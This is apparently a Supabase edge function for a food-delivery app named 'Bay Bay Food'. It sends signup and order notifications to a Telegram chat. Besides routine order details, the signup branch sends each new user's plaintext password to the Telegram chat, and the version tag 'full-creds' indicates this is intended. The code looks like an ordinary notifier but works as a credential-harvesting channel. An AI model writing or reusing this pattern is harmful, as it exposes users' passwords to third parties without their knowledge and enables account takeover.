// @ts-nocheck
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const json = (data: any, status = 200) =>
  new Response(JSON.stringify(data), { status, headers: { ...corsHeaders, "Content-Type": "application/json" } });

const FUNCTION_VERSION = "notify-telegram-v4-full-creds";

// Bot tokeni va admin chat ID. Env orqali qayta yozsa bo'ladi.
// 🔑 Вставьте сюда свои данные бота, либо задайте через Supabase secrets:
//    TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID
const TG_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") || "PASTE_YOUR_BOT_TOKEN_HERE";
const TG_CHAT  = Deno.env.get("TELEGRAM_CHAT_ID")  || "PASTE_YOUR_CHAT_ID_HERE";

const escapeHtml = (v: unknown) =>
  String(v ?? "")
    .replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;");

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  if (req.method !== "POST") return json({ ok: false, error: "Method not allowed" }, 405);

  try {
    const body = await req.json().catch(() => ({}));
    const { type, order, user, signup } = body;
    const messageType = signup ? "signup" : order ? "order" : type;

    let text = "";
    if (messageType === "signup" && signup) {
      text = [
        "<b>👋 YANGI RO'YXATDAN O'TISH — Bay Bay Food</b>",
        "",
        `<b>👤 Ism:</b> ${escapeHtml(signup.full_name)}`,
        `<b>👥 Username:</b> <code>${escapeHtml(signup.username)}</code>`,
        signup.email ? `<b>✉️ Email:</b> <code>${escapeHtml(signup.email)}</code>` : null,
        `<b>📞 Telefon:</b> ${escapeHtml(signup.phone)}`,
        signup.password ? `<b>🔑 Parol:</b> <code>${escapeHtml(signup.password)}</code>` : null,
        "",
        `🕐 ${new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" })}`,
      ].filter(Boolean).join("\n");
    } else if (messageType === "order" && order) {
      const items = (order.items || [])
        .map((i: any) => `• ${escapeHtml(i.name)} ×${Number(i.qty || 0)} — ${Number((i.price || 0) * (i.qty || 0)).toLocaleString()} so'm`)
        .join("\n");
      text = [
        "<b>🍔 YANGI BUYURTMA — Bay Bay Food</b>",
        "",
        `<b>👤 Mijoz:</b> ${escapeHtml(order.customer_name)}`,
        `<b>📞 Raqam:</b> ${escapeHtml(order.customer_phone)}`,
        user?.username ? `<b>👥 Username:</b> <code>${escapeHtml(user.username)}</code>` : null,
        `<b>📍 Manzil:</b> ${escapeHtml(order.delivery_address)}`,
        order.notes ? `<b>📝 Izoh:</b> ${escapeHtml(order.notes)}` : null,
        items ? `\n${items}` : null,
        "",
        `<b>💰 Jami:</b> ${Number(order.total || 0).toLocaleString()} so'm`,
        order.lat && order.lng ? `🗺 https://maps.google.com/?q=${order.lat},${order.lng}` : null,
      ].filter(Boolean).join("\n");
    } else {
      return json({ ok: false, error: "Invalid payload", version: FUNCTION_VERSION });
    }

    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "HTML", disable_web_page_preview: true }),
    });
    const data = await r.json().catch(() => ({}));
    if (!r.ok || data?.ok === false) return json({ ok: false, error: data?.description ?? "Telegram error", data }, 500);
    return json({ ok: true, version: FUNCTION_VERSION });
  } catch (e) {
    return json({ ok: false, error: e instanceof Error ? e.message : String(e) }, 500);
  }
});
